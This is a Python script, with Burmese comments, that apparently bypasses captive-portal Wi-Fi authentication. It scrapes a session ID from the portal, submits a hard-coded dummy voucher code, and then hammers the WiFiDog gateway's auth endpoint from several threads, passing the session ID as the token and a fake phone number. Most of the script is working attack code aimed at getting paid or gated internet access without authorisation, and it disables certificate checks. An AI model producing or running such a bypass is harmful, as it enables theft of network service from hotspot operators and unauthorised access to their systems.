import requests
import re
import urllib3
import time
import threading
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- SETTINGS ---
PING_THREADS = 5
PING_INTERVAL = 0.1 

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def high_speed_ping(auth_link, session, sid):
    """Auth Link ကို အဆက်မပြတ် Request ပို့ပေးခြင်း"""
    while True:
        try:
            res = session.get(auth_link, timeout=5)
            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
        except: break
        time.sleep(PING_INTERVAL)

def start_process():
    print(f"[{time.strftime('%H:%M:%S')}] Turbo Script with Voucher Initialization...")
    
    while True:
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    print(f"[{time.strftime('%H:%M:%S')}] Internet OK. Waiting...           ", end='\r')
                    time.sleep(5)
                    continue
            
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            # ၁။ SID ရှာဖွေခြင်း
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                # ၂။ Voucher ကို တစ်ကြိမ် "မဖြစ်မနေ" အရင်စမ်းသပ်ခြင်း
                print(f"\n[*] Activating Session with Voucher API...")
                voucher_api = f"{portal_host}/api/auth/voucher/"
                try:
                    # accessCode နေရာတွင် 123456 အပြင် လိုအပ်ပါက ပြောင်းလဲနိုင်သည်
                    v_res = session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                    print(f"[+] Voucher API Response: {v_res.status_code}")
                except:
                    print("[!] Voucher API Failed (Gateway might not require it)")

                # ၃။ Gateway Info ယူပြီး Ping ထိုးခြင်း
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                print(f"[*] SID: {sid} | Starting {PING_THREADS} Turbo Threads...")

                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

                while check_real_internet():
                    time.sleep(5)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    start_process()
